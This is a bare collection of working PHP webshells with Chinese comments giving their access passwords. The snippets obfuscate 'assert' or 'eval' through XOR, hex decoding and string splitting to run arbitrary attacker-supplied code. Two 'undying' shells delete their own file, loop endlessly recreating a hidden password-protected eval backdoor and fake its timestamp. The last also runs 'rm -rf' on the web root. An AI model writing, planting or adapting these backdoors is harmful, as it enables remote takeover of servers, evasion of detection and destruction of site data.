<?php 
error_reporting(0);
class  AFHB{ function afhb($mysql){
    $_0='M'^hex2bin('2c');        //a
    $_1=']'^hex2bin('2e');        //s  
    $_2='!'^hex2bin('52');        //s
    $_3='H'^hex2bin('2d');        //e
    $_4='W'^hex2bin('25');        //r
    $_5=']'^hex2bin('29');        //t
    $config=$_0.$_1.$_2.$_3.$_4.$_5;
    return $config($mysql);}}
$afhb=new AFHB();
$afhb->afhb($_POST['yzddmr6']);
?>

<?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>


<?php
# 连接方式php?2=assert
# 密码为1
($_=@$_GET[2]).@$_($_POST[1])
?>

<?php
$a=chr( 96^5);
$b=chr( 57^79);
$c=chr( 15^110);
$d=chr( 58^86);
$e= '($_REQUEST[C])';
@assert($a.$b.$c.$d.$e);
# ?b=))99(rhC(tseuqeR+lave
?>

<?php
# 配置为n985de9=QGV2YWwoJF9QT1NUWzBdKTs=
# 连接密码: 0
$sF= "PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}
?>

<?php
# 不死马
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["cmd"]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" shell2.php');
    usleep(5000);
}
?>

<?php
# 不死马
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.fff.php';
$code = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsncGFzcyddKT09JzVkYTc4MTcwYTIwNzc4M2EwOWUxNzlkNDg4ZjRhOWMzJylAZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==');
//pass=pass
while (1){
    if(md5(file_get_contents($file))!==md5($code)) {
        file_put_contents($file, $code);}
    system('touch -m -d "2021-12-01 09:10:12" ' . $file);
    system("rm -rf /var/www/html/* !(.fff.php)");
    usleep(100);
}
?>
